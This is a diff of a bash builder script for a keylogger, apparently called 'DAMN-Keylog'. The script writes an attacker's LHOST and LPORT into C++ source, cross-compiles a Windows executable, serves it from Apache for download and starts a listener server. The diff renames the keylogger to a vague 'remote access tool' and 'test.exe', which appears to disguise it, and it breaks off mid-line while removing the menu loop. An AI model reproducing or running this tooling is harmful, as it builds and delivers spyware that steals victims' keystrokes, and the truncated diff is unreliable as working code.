@@ -4,11 +4,11 @@
 display_banner() {
   echo -e "\e[92m#################################################\e[0m"
   echo -e "\e[92m#                                               #\e[0m"
-  echo -e "\e[92m#                \e[91mDAMN-Keylog\e[92m                    #\e[0m"
+  echo -e "\e[92m#                \e[91mDMAN\e[92m           #\e[0m"
   echo -e "\e[92m#                                               #\e[0m"
   echo -e "\e[92m#################################################\e[0m"
   echo -e "\e[93m"
-  }
+}
 
 # Default values
 LHOST="127.0.0.1"
@@ -16,44 +16,49 @@ LPORT="9999"
 
 # Function to show options
 show_options() {
-  echo -e "\e[93mDefault Options:\e[0m"
+  echo -e "\e[93mConfiguration Options:\e[0m"
   echo "LHOST: $LHOST"
   echo "LPORT: $LPORT"
-  echo -e "\e[93mTo set LHOST, type: set LHOST=<IP_ADDRESS>\e[0m"
-  echo -e "\e[93mTo set LPORT, type: set LPORT=<PORT_NUMBER>\e[0m"
-  echo -e "\e[93mTo generate keylogger, type: generate\e[0m"
+  echo -e "\e[93mTo change LHOST, type: set LHOST=<IP_ADDRESS>\e[0m"
+  echo -e "\e[93mTo change LPORT, type: set LPORT=<PORT_NUMBER>\e[0m"
+  echo -e "\e[93mTo deploy, type: deploy\e[0m"
 }
 
-# Function to compile and set up keylogger
-generate_keylogger() {
+# Function to compile and set up remote access tool
+deploy_tool() {
+  if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then
+      echo "Compiler not installed. Installing now..."
+      sudo apt-get install -y mingw-w64
+  fi
+
   echo "Updating C++ code with the provided LHOST and LPORT..."
-  sed -i "s/REPLACE_WITH_LHOST/$LHOST/" keylogger.cpp
-  sed -i "s/REPLACE_WITH_LPORT/$LPORT/" keylogger.cpp
+  sed -i "s/REPLACE_WITH_LHOST/$LHOST/" program.cpp
+  sed -i "s/REPLACE_WITH_LPORT/$LPORT/" program.cpp
 
   echo "Compiling the C++ code..."
-  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ keylogger.cpp -o keylogger.exe -lws2_32
+  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ program.cpp -o test.exe -lws2_32
 
-  echo "Compilation completed. The keylogger executable is keylogger.exe"
+  echo "Compilation completed. The executable is test.exe"
 
-  echo "Moving the keylogger executable to the Apache server directory..."
-  sudo mv keylogger.exe /var/www/html/
+  echo "Moving the executable to the Apache server directory..."
+  sudo mv test.exe /var/www/html/
 
   echo "Starting Apache server..."
   sudo systemctl start apache2
 
-  echo "The keylogger is available at: http://$LHOST/keylogger.exe"
+  echo "The tool is available at: http://$LHOST/test.exe"
 }
 
-# Function to start the Python server
+# Function to start the server
 start_server() {
-  echo "Running the Python server..."
+  echo "Running the server..."
   python3 server.py
 }
 
 # Ensure the system is updated and install necessary packages
 echo "Updating system and installing necessary packages..."
 sudo apt-get update
-sudo apt-get install -y mingw-w64 python3 apache2 git
+sudo apt-get install -y python3 apache2 git
 
 # Display the banner
 display_banner
@@ -70,29 +75,9 @@ while true; do
       show_options
       while true; do
         read INPUT
-        if [[ $INPUT == "generate" ]]; then
-          generate_keylogger
+        if [[ $INPUT == "deploy" ]]; then
+          deploy_tool
           break
         elif [[ $INPUT == set\ LHOST=* ]]; then
           LHOST=${INPUT#*=}
-          echo "LHOST set to $LHOST"
-        elif [[ $INPUT == set\ LPORT=* ]]; then
-          LPORT=${INPUT#*=}
-          echo "LPORT set to $LPORT"
-        else
-          echo "Invalid input. Type 'generate' to compile or 'set LHOST=<IP_ADDRESS>' or 'set LPORT=<PORT_NUMBER>' to set options."
-        fi
-      done
-      ;;
-    2)
-      start_server
-      ;;
-    3)
-      echo "Exiting..."
-      exit 0
-      ;;
-    *)
-      echo "Invalid option. Please select 1, 2, or 3."
-      ;;
-  esac
-done
+          echo "LHOST set to
